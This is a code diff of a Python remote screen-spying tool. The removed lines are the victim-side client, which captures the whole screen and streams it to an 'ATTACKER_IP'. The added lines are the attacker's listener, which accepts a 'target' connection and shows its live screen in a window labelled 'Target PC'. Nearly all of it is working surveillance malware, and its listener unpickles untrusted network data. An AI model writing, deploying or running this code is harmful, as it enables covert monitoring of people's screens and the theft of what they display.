@@ -2,43 +2,53 @@ import socket
 import cv2
 import pickle
 import struct
-import numpy as np
-from mss import mss
 
-ATTACKER_IP = "127.0.0.1" 
+# Listen on all network interfaces
+ATTACKER_IP = "0.0.0.0"
 PORT = 5555
 
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((ATTACKER_IP, PORT))
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((ATTACKER_IP, PORT))
+server.listen(1)
+print("[*] Screen Streamer Listener started. Waiting for target...")
 
-# Initialize the screen capture tool
-sct = mss()
+target_socket, address = server.accept()
+print(f"[+] Connected to target: {address}")
 
-# Use the combined primary monitor configuration instead of a dynamic list
-monitor = sct.monitors[0] 
-
-print("[+] Target streaming started successfully...")
+data = b""
+payload_size = struct.calcsize("Q") # 'Q' is unsigned long long (8 bytes)
 
 try:
     while True:
-        # Grab the raw pixel data directly (bypassing the buggy .shot method)
-        sct_img = sct.grab(monitor)
-        img = np.array(sct_img)
+        # Retrieve the size of the incoming image frame
+        while len(data) < payload_size:
+            packet = target_socket.recv(4 * 1024)
+            if not packet: break
+            data += packet
+            
+        if not data: break
         
-        # Downscale the image to 720p for silky smooth network transfer
-        img = cv2.resize(img, (1280, 720))
+        packed_msg_size = data[:payload_size]
+        data = data[payload_size:]
+        msg_size = struct.unpack("Q", packed_msg_size)[0]
         
-        # Convert image to standard BGR format and drop transparency
-        frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+        # Retrieve the actual image data based on the frame size
+        while len(data) < msg_size:
+            data += target_socket.recv(4 * 1024)
+            
+        frame_data = data[:msg_size]
+        data = data[msg_size:]
         
-        # Package and serialize the image bytes
-        serialized_frame = pickle.dumps(frame)
-        message = struct.pack("Q", len(serialized_frame)) + serialized_frame
+        # Decompress the bytes back into a visual image frame
+        frame = pickle.loads(frame_data)
         
-        # Send the live video frame bytes across the connection
-        client.sendall(message)
+        # Display the live screen in a window
+        cv2.imshow("Target PC - Live Screen Stream", frame)
         
-except Exception as e:
-    print(f"[-] Stream disconnected: {e}")
+        # Break the loop if the attacker presses the 'q' key
+        if cv2.waitKey(1) & 0xFF == ord('q'):
+            break
 finally:
-    client.close()
+    cv2.destroyAllWindows()
+    target_socket.close()
+    server.close()
